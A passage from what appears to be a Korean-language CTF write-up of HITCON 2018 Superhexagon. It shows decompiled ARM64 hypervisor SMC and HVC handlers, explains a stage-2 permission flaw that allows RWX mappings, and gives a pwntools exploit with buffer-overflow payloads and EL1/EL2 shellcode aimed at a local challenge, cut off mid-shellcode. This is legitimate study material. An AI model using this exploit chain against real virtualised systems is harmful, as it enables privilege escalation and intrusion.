</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> SMC_handler(<span style="color:#ae81ff">0x83000003</span>,x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      x0 <span style="color:#f92672">=</span> SMC_handler(x0,x1);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    lVar1 <span style="color:#f92672">=</span> elr_el2;
</span></span><span style="display:flex;"><span>    x1 <span style="color:#f92672">=</span> lVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">/*</span> terminate <span style="color:#f92672">*/</span>
</span></span><span style="display:flex;"><span>    elr_el2 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    FUN_40101020(s_EC_<span style="color:#f92672">=</span>_<span style="color:#f92672">%</span><span style="color:#ae81ff">08</span>x,_ISS_<span style="color:#f92672">=</span>_<span style="color:#f92672">%</span><span style="color:#ae81ff">08</span>x_401021a8,EC,(uint)ESR <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffff</span>);
</span></span><span style="display:flex;"><span>    x1 <span style="color:#f92672">=</span> FUN_401009c8();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>saved_reg <span style="color:#f92672">=</span> x0;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> x1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이전에 spsel = 0으로 해주고 위 함수로 점프한다.
EL1에서 smc를 통해 secure monitor를 call 할 수 있던 이유는 여기서 저런식으로 따로 핸들링을 다시 해줬기 때문이였다.
EL1에서 mmap, mprotect 핸들링시에 hypercall로 EL2를 부르는데 EL2는 여기서 EL2 page table을 변경한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined <span style="color:#f92672">*</span> <span style="color:#a6e22e">HVC_handler</span>(ulong x1,ulong x2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar1;
</span></span><span style="display:flex;"><span>  ulong uVar2;
</span></span><span style="display:flex;"><span>  ulong idx_addr;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  idx_addr <span style="color:#f92672">=</span> x1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b0000000111111111;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3b000</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_40107000 <span style="color:#f92672">+</span> (idx_addr <span style="color:#f92672">+</span> (x1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">21</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000090004c3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>DAT_40107000;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3c000</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* x1 &lt; 0xc000 and must not be writable */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xc000</span>) <span style="color:#f92672">&amp;&amp;</span> (((uint)x2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_4010009c</span>(s__[VMM]_try_to_map_writable_pages_40102130);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_401006a8</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_40100774</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* (el0/el1 execution) and (no write) */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((x2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x40000000000080</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x80</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* ? IPA influences the determination of the PA. */</span>
</span></span><span style="display:flex;"><span>        puVar1 <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)(x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span> <span style="color:#f92672">|</span> x2);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">**</span>)(<span style="color:#f92672">&amp;</span>DAT_40107000 <span style="color:#f92672">+</span> (idx_addr <span style="color:#f92672">+</span> (x1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">21</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> puVar1;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* level2 descriptor n = 21 */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> puVar1;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_4010009c</span>(s__[VMM]_RWX_pages_are_not_allowed_40102168);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_401006a8</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_40100774</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_4010009c</span>(s__[VMM]_Invalid_IPA_40102190);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_401006a8</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_40100774</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_401009e4</span>(<span style="color:#f92672">&amp;</span>DAT_40106000,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_401009e4</span>(<span style="color:#f92672">&amp;</span>DAT_40107000,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x8000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (idx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; idx_addr <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200000</span>; idx_addr <span style="color:#f92672">=</span> idx_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200000</span>) {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> idx_addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x15</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>분석하다가 얼마 안돼서 뭔가 이상함을 발견했다.
애초에 쓰는게 descriptor인데 IPA가 PA에 저렇게 raw하게 영향을 주면 안된다는 것을 깨달았다.
그리고 이 취약점을 이용하면 0x3c000보다 작은 임의 IPA에 대해 할당하고 PA를 매핑할 때 S2AP는 하위 1바이트안에 들어가니 이를 이용해 RWX 페이지를 매핑할 수 있다는 것을 알았다.
근데 IPA는 EL1에서 임의 코드 실행을 달성한 순간부터 원하는 VA와 매핑할 수 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/c6a0733d063d71922ba30f130677810c.png" alt=""  />

사실 익스플로잇 방식은 추가적으로 찾아봤을때 유사한것으로 보인다.
위 그림에서 설명하는건 일종의 mitigation이긴 하다.
EL2에서 취약점은 IPA갖고 엔트리의 플래그가 바뀌는 취약점으로 인해 위 사진과는 다르게 권한 고정이 애초에 실패한 문제가 생겼다.
하이퍼바이저쪽 페이지 권한이 컨트롤 가능하다면, 사실상 IPA는 이미 컨트롤가능하니 이걸로 이전과 똑같이 공격을 하면 된다.</p>
<p>마저 익스플로잇 전략을 설명하자면 hypercall handler가 위치한 페이지를 바꿔치기해서 다음과 같이 해준다.</p>
<ol>
<li>EL1에서 EL0쪽 PTE를 변조해서 특정 IPA를 가리키도록 하고 AP 01로 설정한다.</li>
<li>hvc로 변조한 특정 IPA를 hypervisor의 handler 코드 페이지를 가리키는 PA로 세팅하고 S2AP 11로 설정한다.</li>
<li>EL2 shellcode를 EL2 0x40102000에 복사한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/e13df9b643049373581aa1888e4a1078.png" alt=""  />

참고로 gef pagewalk가 권한을 틀리게 보여줘서 직접 손으로 pagewalk해서 확인했다.</li>
</ol>
<h2 id="exploit-code-flag--code-execution">Exploit code (flag &amp; code execution)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-flag--code-execution">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">6666</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>UART<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000009000000</span>
</span></span><span style="display:flex;"><span>read_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>]
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(UART)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) <span style="color:#f92672">+</span> bytes(read_flag) <span style="color:#f92672">+</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x0, sp, x9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x9, x9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">+</span>EL2_shellcode
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc001e000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf0</span> 
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc00091b8</span>
</span></span><span style="display:flex;"><span>IPA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2400</span> <span style="color:#f92672">|</span> (<span style="color:#ae81ff">0b11</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">6</span>) <span style="color:#75715e"># s2ap 11</span>
</span></span><span style="display:flex;"><span>DESC <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100000</span>
</span></span><span style="display:flex;"><span>EL2_TEXT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffeffffa000</span>
</span></span><span style="display:flex;"><span>entry_user <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0028000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfd0</span>
</span></span><span style="display:flex;"><span>user_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2403</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x0020000000000000</span><span style="color:#75715e"># ap 01</span>
</span></span><span style="display:flex;"><span>EL2_shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffc100</span>
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x400</span><span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>(IPA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>(DESC)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // PA 0x0000000040102000 RWX
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
